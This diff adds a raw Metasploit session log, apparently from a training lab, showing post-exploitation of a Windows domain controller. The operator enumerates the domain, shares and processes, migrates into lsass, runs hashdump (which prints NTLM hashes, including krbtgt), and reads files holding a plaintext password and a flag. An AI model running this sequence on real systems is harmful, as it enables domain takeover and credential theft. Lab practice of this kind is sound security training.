@@ -1,0 +1,153 @@
+
+msf5 exploit(windows/smb/psexec) > use post/windows/gather/enum_domain
+msf5 post(windows/gather/enum_domain) > options
+
+Module options (post/windows/gather/enum_domain):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(windows/gather/enum_domain) > set session 1
+session => 1
+msf5 post(windows/gather/enum_domain) > run
+
+[+] FOUND Domain: FLASH
+[+] FOUND Domain Controller: ACME-TEST (IP: 10.10.167.35)
+[*] Post module execution completed
+msf5 post(windows/gather/enum_domain) > 
+
+
+msf5 exploit(windows/smb/psexec) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                      Connection
+  --  ----  ----                     -----------                      ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.10.192.66:4444 -> 10.10.167.35:54913 (10.10.167.35)
+
+msf5 exploit(windows/smb/psexec) > use post/windows/gather/enum_shares
+msf5 post(windows/gather/enum_shares) > options
+
+Module options (post/windows/gather/enum_shares):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CURRENT  true             yes       Enumerate currently configured shares
+   ENTERED  true             yes       Enumerate Recently entered UNC Paths in the Run Dialog
+   RECENT   true             yes       Enumerate Recently mapped shares
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(windows/gather/enum_shares) > set session 1
+session => 1
+msf5 post(windows/gather/enum_shares) > run
+
+[*] Running against session 1
+[*] The following shares were found:
+[*] 	Name: SYSVOL
+[*] 
+[*] 	Name: NETLOGON
+[*] 
+[*] 	Name: speedster
+[*] 
+[*] Post module execution completed
+msf5 post(windows/gather/enum_shares) >
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                                       Arch  Session  User                          Path
+ ---   ----  ----                                       ----  -------  ----                          ----
+ 0     0     [System Process]                                                                        
+ 4     0     System                                     x64   0                                      
+ 68    4     Registry                                   x64   0                                      
+ 400   4     smss.exe                                   x64   0                                      
+ 440   692   dwm.exe                                    x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
+ 552   540   csrss.exe                                  x64   0                                      
+ 628   620   csrss.exe                                  x64   1                                      
+ 644   540   wininit.exe                                x64   0                                      
+ 692   620   winlogon.exe                               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 756   644   services.exe                               x64   0                                      
+ 772   644   lsass.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+ 888   756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 904   756   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 956   756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1000  756   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1068  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1156  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1168  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1176  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1244  756   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1404  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1436  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1680  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1724  3928  conhost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
+ 2008  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2052  756   msdtc.exe                                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
+ 2120  644   fontdrvhost.exe                            x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
+ 2128  692   fontdrvhost.exe                            x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
+ 2196  756   spoolsv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 2220  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2232  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 2272  1616  powershell.exe                             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+ 2292  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2316  756   amazon-ssm-agent.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 2348  756   ismserv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\ismserv.exe
+ 2368  756   Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
+ 2380  756   LiteAgent.exe                              x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 2396  756   dfsrs.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfsrs.exe
+ 2404  756   dns.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dns.exe
+ 2460  756   dfssvc.exe                                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfssvc.exe
+ 2932  756   vds.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
+ 3016  2316  ssm-agent-worker.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\ssm-agent-worker.exe
+ 3024  3016  conhost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
+ 3272  692   LogonUI.exe                                x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
+ 3344  2272  conhost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
+ 3928  8     powershell.exe                             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+
+meterpreter > migrate 772
+[*] Migrating from 3928 to 772...
+[*] Migration completed successfully.
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
+ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
+jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
+lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
+erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
+ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:dc23a46470ab50338b38eb6355874ff6:::
+meterpreter > 
+
+
+
+
+meterpreter > search -f secrets.txt
+Found 1 result...
+    c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt (35 bytes)
+
+
+meterpreter > ls
+Listing: C:\Program Files (x86)\Windows Multimedia Platform
+===========================================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100666/rw-rw-rw-  35     fil   2021-07-30 08:43:58 +0100  secrets.txt
+100666/rw-rw-rw-  40432  fil   2018-09-15 08:12:04 +0100  sqmapi.dll
+
+meterpreter > cat secrets.txt
+My Twitter password is KDSvbsw3849! 
+
+meterpreter > search -f realsecret.txt
+Found 1 result...
+    c:\inetpub\wwwroot\realsecret.txt (34 bytes)
+
+
+meterpreter > cat realsecret.txt 
+The Flash is the fastest man alive
+
